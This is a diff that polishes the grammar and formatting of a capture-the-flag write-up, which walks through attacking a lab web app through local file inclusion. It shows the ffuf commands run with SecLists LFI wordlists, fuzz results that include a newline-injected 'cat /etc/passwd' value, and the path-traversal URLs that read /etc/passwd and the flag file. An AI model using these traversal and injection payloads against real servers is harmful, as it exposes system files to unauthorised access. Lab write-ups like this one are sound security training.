@@ -1,8 +1,6 @@
-As we hit the url that we got "http://10.48.136.217/" Into the browser it gave us a homepage of songs that looks like this 
+As we hit the URL `http://10.48.136.217/` in the browser, it gave us a homepage of songs. 🎵
 
-<homepage_pic>
-
-Here is the source code 
+Here is the source code:
 ```html
 
 <!DOCTYPE html>
@@ -135,9 +133,9 @@ Here is the source code
 </html>
 ```
 
-As we can see source code is not giving any clue to flag.
+As we can see, the source code doesn't give us any clue about the flag.
 
-So we proceed to Directory enumuration and it gave us
+So we proceeded to directory enumeration and it gave us:
 
 ```text
 [23:34:48] 403 -  244B  - /.ht_wsr.txt                                      
@@ -160,27 +158,27 @@ So we proceed to Directory enumuration and it gave us
 [23:35:44] 403 -  240B  - /server-status  
 
 ```
-But this  also doesn't gave us a Interesting endpoint for the further enumuration.
+But this also didn't give us any interesting endpoint for further enumeration.
 
-In the Homepage under the section Discography When tapped on Relax the url changes to **http://10.48.136.217/?page=relax.php**
+On the homepage, under the **Discography** section, clicking on **Relax** changes the URL to `http://10.48.136.217/?page=relax.php`
 
-So here we can do fuzzing on this url for different pages.
+So here we can do fuzzing on this URL for different pages.
 
-<fuzz_res>
+![fuzz_res](fuzz_res.png)
 
-As we can see it has only listed 2 endpoints.
+As we can see, it has listed only 2 endpoints.
 
-So we are trying manually different values for the page=
+So we tried manually different values for `page=`
 
-and in this many tries wehn i put page=/home it showed me something interesting.
+And in these many tries, when I put `page=/home`, it showed something interesting. 🤔
 
-<hackerr_spot>
+![hackerr_spot](hackerr_spot.png)
 
-but with some steps i understand what whatever will be after / no matter it prints *HACKKERRR!! HACKER DETECTED. STOP HACKING YOU STINKIN HACKER!*
+But after some testing, I realized that whatever comes after `/`, it always prints *HACKKERRR!! HACKER DETECTED. STOP HACKING YOU STINKIN HACKER!*
 
-Now we know it somehow reacts to some payload so this room is about LFI path transversal and File Inclusion.
+Now we know it reacts to certain payloads, so this room is about **LFI Path Traversal and File Inclusion**.
 
-We need to do fuzzing with the wordlist mainly focused on LFI path transversal and File Inclusion. As it webserver is apache.
+We need to do fuzzing with a wordlist focused on LFI path traversal and File Inclusion, since the web server is Apache.
 
 ```
 Not Found
@@ -189,14 +187,14 @@ The requested URL /fas was not found on this server.
 Apache/2.2.22 (Ubuntu) Server at 10.48.161.15 Port 80
 ```
 
-Now we do fuzzing with those having the websever as apache. The wordlist is */home/Seclists/Discovery/Web-Content/Web-Servers/Apache.txt* with the command
+Now we do fuzzing with payloads targeting the web server as Apache. The wordlist is */home/Seclists/Discovery/Web-Content/Web-Servers/Apache.txt* with the command
 
 ```
 ffuf -u http://10.48.161.15/?page=FUZZ -w /home/Seclists/Discovery/Web-Content/Web-Servers/Apache.txt -fw 1367,1369
 ```
- This also not gave us a valid endpoint. 
+ This also didn't give us a valid endpoint.
 
-So i searched inside the seclist and found there is spcifically many files fo r the lfi under the folder /Seclists/fuzzing/lfi/
+So I searched inside SecList and found there are specifically many files for LFI under the folder `/Seclists/fuzzing/lfi/`:
 ```
 LFI-etc-files-of-all-linux-packages.txt     
 LFI-gracefulsecurity-linux.txt              
@@ -209,16 +207,16 @@ LFI-Windows-adeadfed.txt
 OMI-Agent-Linux.txt
 ```
 
-We are going to specfically use the LFI-Jhaddix.txt.
+We are going to specifically use `LFI-Jhaddix.txt`.
 
-With The command
+With the command
 
 ```
 ffuf -u http://10.48.161.15/?page=FUZZ -w 
 /home/Seclists/fuzzing/lfi/LFI-Jhaddix.txt -fw 1367,1369
 ```
 
-And we will get several endpoint with this command only.
+And we will get several endpoints with this command:
 
 ```
 %0a/bin/cat%20/etc/passwd [Status: 200, Size: 3987, Words: 1368, Lines: 125, Duration: 79ms]
@@ -278,17 +276,15 @@ And we will get several endpoint with this command only.
 
 ```
 
-Let's Hit the first endpoint 
+Let's hit the first endpoint 🎯
 
-*http://10.48.161.15/?page=..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd*
+`http://10.48.161.15/?page=..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd`
 
-and we got 
+and we got:
 
 ```
 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh
 ```
-Now the endpoint *http://10.48.161.15/?page=..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd* is giving me the content of /etc/passwd
+Now the endpoint `http://10.48.161.15/?page=..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd` is giving us the content of `/etc/passwd`.
 
-And if we modify the url to this *http://10.48.161.15/?page=..%2F..%2F..%2F%2F..%2F..%2Fflag.txt* We will get the flag
-
-<flag_img>
+And if we modify the URL to `http://10.48.161.15/?page=..%2F..%2F..%2F%2F..%2F..%2Fflag.txt`, we get the flag! 🚩
